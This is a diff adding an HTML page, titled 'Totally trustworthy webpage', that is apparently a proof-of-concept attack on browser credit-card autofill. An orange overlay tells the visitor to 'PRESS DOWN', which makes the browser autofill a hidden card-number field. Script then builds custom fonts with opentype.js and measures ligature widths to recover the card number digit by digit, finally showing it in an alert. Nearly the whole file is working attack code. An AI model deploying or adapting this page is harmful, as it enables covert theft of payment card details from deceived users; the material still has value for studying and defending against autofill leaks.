@@ -1,0 +1,159 @@
+<!doctype>
+<title>Totally trustworthy webpage</title>
+<script src="/static/opentype.js"></script>
+<style>
+textarea {
+    white-space: nowrap;
+    text-transform: lowercase;
+    width: 10px;
+}
+#cover {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: orange;
+}
+</style>
+<form id="paymentForm">
+    <input name="ccname"
+           id="nameInput"
+           required=""
+           placeholder="Full Name"
+           autocomplete="cc-name"
+           autofocus="" rows="1">
+    <textarea name="cardnumber"
+              id="cardNumberTextArea"
+              autocomplete="cc-number"
+              rows="1"
+              contenteditable="true"></textarea>
+</form>
+<div id="cover">
+    <h1>PRESS DOWN</h1>
+</div>
+<script>
+
+// Utility function; nicked from https://stackoverflow.com/a/35385518/1709587
+function htmlToElement(html) {
+    var template = document.createElement('template');
+    html = html.trim(); // Never return a text node of whitespace as the result
+    template.innerHTML = html;
+    return template.content.firstChild;
+}
+// Utility function; nicked from https://stackoverflow.com/a/33292942/1709587
+function timeout(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+let fontsGenerated = 0;
+/**
+ * Given an opentype.js font, creates a font family that uses it.
+ */
+function fontFamilyFromFont(font) {
+    var arrayBuffer = font.toArrayBuffer();
+    var dataView = new DataView(arrayBuffer);
+    var blob = new Blob([dataView], {type: 'font/opentype'});
+    var fontUrl = window.URL.createObjectURL(blob);
+    const fontName = `customfont${fontsGenerated++}`;
+    var styleElement = htmlToElement(`
+        <style>
+            @font-face {
+              font-family: '${fontName}';
+              src: url('${fontUrl}') format('truetype');
+            }
+        </style>
+    `);
+    document.head.appendChild(styleElement)
+    return fontName;
+}
+
+/**
+ * Returns a font in which the string stringToFind is 1000px wide and
+ * everything else uses 0 space.
+ */
+function fontThatTestsForString(stringToFind) {
+    var notdefGlyph = new opentype.Glyph({
+    name: '.notdef',
+    unicode: 0,
+    advanceWidth: 1,
+        path: new opentype.Path(),
+    });
+    const glyphs = [notdefGlyph];
+    for (let i=1; i<128; i++) {
+        const glyph = new opentype.Glyph({
+            name: 'bla',
+            unicode: i,
+            advanceWidth: 1,
+            path: new opentype.Path(),
+        });
+        glyphs.push(glyph);
+    }
+
+    var matchGlyph = new opentype.Glyph({
+        name: 'bla',
+        unicode: 128,
+        advanceWidth: 32767,
+        path: new opentype.Path(),
+    });
+    glyphs.push(matchGlyph);
+    var font = new opentype.Font({
+        familyName: 'bla',
+        styleName: 'bla',
+        unitsPerEm: 1000,
+        ascender: 800,
+        descender: -200,
+        glyphs: glyphs
+    });
+
+    const asciiCodesInString = [];
+    for (let i=0; i<stringToFind.length; i++) {
+        asciiCodesInString.push(stringToFind.charCodeAt(i));
+    }
+
+    font.substitution.add('liga', { sub: asciiCodesInString, by: 128});
+    return font;
+}
+
+async function containsString(textarea, string) {
+    var styleElement = htmlToElement(`
+        <style>
+            #cardNumberTextArea::first-line {
+                font-family: ${fontFamilyFromFont(
+                    fontThatTestsForString(string)
+                )};
+                color:orange;
+            }
+        </style>
+    `);
+    document.head.appendChild(styleElement);
+    await timeout(30);
+    result = textarea.scrollWidth > 100;
+    return result;
+}
+
+async function determineCardNumber(foundSoFar='') {
+    console.log(foundSoFar);
+    for (let i=0; i<=9; i++) {
+        if (await containsString(cardNumberTextArea, foundSoFar + i)) {
+            return await determineCardNumber(foundSoFar + i);
+        }
+    }
+    for (let i=0; i<=9; i++) {
+        if (await containsString(cardNumberTextArea, i + foundSoFar)) {
+            return await determineCardNumber(i + foundSoFar);
+        }
+    }
+    return foundSoFar;
+}
+
+nameInput.addEventListener('keydown', async function (e) {
+    if (e.keyCode == 38 || e.keyCode == 40) {
+        while (cardNumberTextArea.scrollWidth < 10) {
+            await timeout(1);
+        }
+        nameInput.remove();
+        alert(await determineCardNumber());
+    }
+});
+</script>
